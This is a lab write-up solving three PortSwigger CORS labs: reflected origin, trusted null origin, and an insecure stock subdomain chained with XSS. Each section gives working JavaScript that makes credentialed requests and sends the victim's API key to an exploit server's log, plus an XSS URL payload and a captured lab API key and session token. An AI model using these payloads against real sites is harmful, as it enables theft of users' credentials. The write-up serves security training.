# CORS

### Table of Contents

- [CORS vulnerability with basic origin reflection](#cors-vulnerability-with-basic-origin-reflection)
- [CORS vulnerability with trusted null origin](#cors-vulnerability-with-trusted-null-origin)
- [CORS vulnerability with trusted insecure protocols](#cors-vulnerability-with-trusted-insecure-protocols)

---



### [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

Goal : craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

- log in and access your account page.
- I saw this endpoint `/accountDetails` in the profile page source.

<img src=".\cors\1_1.png" style="zoom:80%;" />

- go to `/accountDetails`, and the observe the `Access-Control-Allow-Credentials` header.

- Send the request to Burp Repeater, and resubmit it with the added header:

  ```javascript
  Origin: test.com
  ```

- Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.

<img src=".\cors\1_2.png" style="zoom:80%;" />

- In the browser, go to the exploit server and enter the following HTML

  ```javascript
  <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','<your-lab-url>/accountDetails',true);
  req.withCredentials = true;
  req.send();
  
  function reqListener() {
     location='<your-exploit-server>/log?key='+this.responseText;
  };
  
  </script>
  ```

- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

- Go back to the exploit server and click **Deliver exploit to victim**.

- Click **Access log**, retrieve and submit the victim's API key to complete the lab.

```json
{  "username": "administrator",  "email": "",  "apikey": "SaCAyGSHgJD1QifqVNXAKr82XZKAra7S",  "sessions": [    "zLW0oQ69tCRLl2Dw3ZOu34JMgMPRa10k"  ]}
```



---



### [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

Goal: craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

- log in and access your account page.

- go to `/accountDetails`, and the observe the `Access-Control-Allow-Credentials` header.

- Send the request to Burp Repeater, and resubmit it with the added header:

  ```json
  Origin: test.com
  ```

- notice that no thing happened with the `Access-Control-Allow-Origin` header. this means it performs whitelist checking on the provided origin

-  resubmit it with the null value `Origin: null`

- Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.

<img src=".\cors\2_1.png" style="zoom:80%;" />

- In the browser, go to the exploit server and enter the following HTML

  ```javascript
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','<your-lab-url>/accountDetails',true);
  req.withCredentials = true;
  req.send();
  
  function reqListener() {
  location='<your-exploit-server>/log?key='+this.responseText;
  };
  </script>"></iframe>
  ```

  >the exploit exists in  sandbox iframe to be sent from null origin

- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click **Deliver exploit to victim**.
- Click **Access log**, retrieve and submit the victim's API key to complete the lab.



---





### [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

Goal: craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

- log in and access your account page.

- go to `/accountDetails`, and the observe the `Access-Control-Allow-Credentials` header.

- Send the request to Burp Repeater, and resubmit it with the added header:

  ```
  Origin: test.com 
  OR
  Origin: null
  ```

- notice that no thing happened with the `Access-Control-Allow-Origin` header. this means it performs whitelist checking on the provided origin

- go to any product and click `check stock` , note that it responds from a `stock` subdomain

- write this subdomain in the `Origin` header 

- Observe that the origin is reflected in the `Access-Control-Allow-Origin` header

<img src=".\cors\3_1.png" style="zoom:80%;" />





- now to exploit the CORS misconfiguration we need to find `XSS` in the stock subdomain or any other one

- Observe the two parameters in the stock subdomain , note that the  `productID` parameter is vulnerable to `XSS`
  ```bash
  http://stock.<your-lab-url>.web-security-academy.net/?productId=1%3cscript%3ealert(1)%3c%2fscript%3e2&storeId=2
  ```

  

<img src=".\cors\3_2.png" style="zoom:80%;" />



- now with `CORS+XSS` we can get the administrator api key by sending a request to the`stock` subdomain with the CORS exploit in the  `productID` parameter
-  go to the exploit server and enter the following HTML

```javascript
<script>
    document.location="http://stock.<your-lab-url>.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://.<your-lab-url>.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-<your-exploit-url>.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click **Deliver exploit to victim**.
- Click **Access log**, retrieve and submit the victim's API key to complete the lab.





---









